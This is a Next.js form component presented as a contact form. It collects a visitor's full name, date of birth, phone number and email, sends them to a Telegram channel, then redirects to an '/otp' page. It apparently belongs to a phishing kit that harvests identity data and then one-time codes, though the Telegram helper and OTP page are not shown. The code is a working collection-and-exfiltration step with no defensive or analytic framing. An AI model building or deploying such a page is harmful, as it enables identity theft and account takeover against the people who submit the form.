"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Head from "next/head";
import { sendTelegramMessage } from "../../utils/telegram"; // Import Telegram function

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/; // U.S. phone format (XXX) XXX-XXXX
const dateRegex = /^\d{4}-\d{2}-\d{2}$/; // YYYY-MM-DD

const validateInput = (field: string, value: string): string => {
  switch (field) {
    case "email":
      return emailRegex.test(value) ? "" : "Please enter a valid email address.";
    case "phone":
      return phoneRegex.test(value) ? "" : "Phone number must be in (XXX) XXX-XXXX format.";
    case "dob":
      return dateRegex.test(value) ? "" : "Please enter a valid date (YYYY-MM-DD).";
    case "firstName":
      return value.trim() ? "" : "First name is required.";
    case "lastName":
      return value.trim() ? "" : "Last name is required.";
    default:
      return "";
  }
};

const FormPage = () => {
  type FormErrors = {
    [key: string]: string; // Each key (form field) maps to an error message
  };
  
  const [formErrors, setFormErrors] = useState<FormErrors>({});  
  const [phone, setPhone] = useState<string>(""); // Phone state for formatting
  const router = useRouter();

  // Function to handle phone number formatting
  const formatPhoneNumber = (input: string) => {
    const cleaned = input.replace(/\D/g, ""); // Remove non-numeric characters
    if (cleaned.length <= 3) return `(${cleaned}`;
    if (cleaned.length <= 6) return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
    return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6, 10)}`;
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedPhone = formatPhoneNumber(e.target.value);
    setPhone(formattedPhone);
  };

  const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const form = e.currentTarget;
    const formData = {
      firstName: (form.elements.namedItem("firstName") as HTMLInputElement).value,
      lastName: (form.elements.namedItem("lastName") as HTMLInputElement).value,
      dob: (form.elements.namedItem("dob") as HTMLInputElement).value,
      phone,
      email: (form.elements.namedItem("email") as HTMLInputElement).value,
    };

    const errors: Record<string, string> = {};  

    Object.keys(formData).forEach((field) => {  
      const typedField = field as keyof typeof formData;  
      const error = validateInput(typedField, formData[typedField]);  
    
      if (error) errors[typedField] = error;  
    });
    
    if (Object.keys(errors).length > 0) {  
      setFormErrors(errors);  
      return;  
    }
    

    // Prepare message for Telegram
    const message = `
      🚨 New Contact Form Submission 🚨
      - Full Name: ${formData.firstName} ${formData.lastName}
      - Date of Birth: ${formData.dob}
      - Phone: ${formData.phone}
      - Email: ${formData.email}
      - Time: ${new Date().toLocaleString()}
    `;

    // Try sending the message to Telegram
    try {
      await sendTelegramMessage(message);
      router.push("/otp"); // Navigate to success page after form submission
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
      alert("An error occurred while submitting the form. Please try again.");
    }
  };

  return (
    <>
      <Head>
        <title>Contact Form</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>
      <div className="min-h-screen flex flex-col bg-gray-50">
        {/* Header */}
        <header className="bg-[#66d3ee] border-b-4">
          <div className="max-w-7xl mx-auto flex items-center p-4">
            <a href="#" className="flex items-center">
              
            </a>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-grow container mx-auto mt-12 px-4">
          <div className="max-w-lg mx-auto bg-white p-10 shadow-lg rounded-xl">
            <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">
              Contact Information Form
            </h1>
            <p className="text-sm text-gray-600 text-center mb-8">
              Please fill out the form below.
            </p>
            <form onSubmit={handleFormSubmit} aria-label="Contact form">
              {/* Name Fields */}
              <div className="grid grid-cols-2 gap-4 mb-6">
                <div>
                  <label htmlFor="firstName" className="block text-sm font-medium text-black">
                    First Name
                  </label>
                  <input
                    id="firstName"
                    name="firstName"
                    type="text"
                    required
                    className={`w-full mt-2 border ${formErrors.firstName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.firstName ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                  />
                  {formErrors.firstName && <p className="text-sm text-red-500 mt-2">{formErrors.firstName}</p>}
                </div>

                <div>
                  <label htmlFor="lastName" className="block text-sm font-medium text-black">
                    Last Name
                  </label>
                  <input
                    id="lastName"
                    name="lastName"
                    type="text"
                    required
                    className={`w-full mt-2 border ${formErrors.lastName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.lastName ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                  />
                  {formErrors.lastName && <p className="text-sm text-red-500 mt-2">{formErrors.lastName}</p>}
                </div>
              </div>

              {/* Date of Birth */}
              <div className="mb-6">
                <label htmlFor="dob" className="block text-sm font-medium text-black">
                  Date of Birth (YYYY-MM-DD)
                </label>
                <input
                  id="dob"
                  name="dob"
                  type="date"
                  required
                  className={`w-full mt-2 border ${formErrors.dob ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.dob ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                />
                {formErrors.dob && <p className="text-sm text-red-500 mt-2">{formErrors.dob}</p>}
              </div>

              {/* Phone Number with Formatting */}
              <div className="mb-6">
                <label htmlFor="phone" className="block text-sm font-medium text-black">
                  Phone Number (U.S.)
                </label>
                <input
                  id="phone"
                  name="phone"
                  type="text"
                  placeholder="(123) 456-7890"
                  required
                  value={phone}
                  onChange={handlePhoneChange}
                  maxLength={14} // Ensures correct format
                  className={`w-full mt-2 border ${formErrors.phone ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.phone ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                />
                {formErrors.phone && <p className="text-sm text-red-500 mt-2">{formErrors.phone}</p>}
              </div>

              {/* Email */}
              <div className="mb-6">
                <label htmlFor="email" className="block text-sm font-medium text-black">
                  Email Address
                </label>
                <input
                  id="email"
                  name="email"
                  type="email"
                  required
                  className={`w-full mt-2 border ${formErrors.email ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.email ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                />
                {formErrors.email && <p className="text-sm text-red-500 mt-2">{formErrors.email}</p>}
              </div>

              {/* Submit Button */}
              <button type="submit" className="w-full px-6 py-3 font-medium text-white bg-[#66d3ee] rounded-lg hover:bg-[#5bbad7] transition focus:outline-none focus:ring-2 focus:ring-blue-600">
                Submit
              </button>
            </form>
          </div>
        </main>
      </div>
    </>
  );
};

export default FormPage;
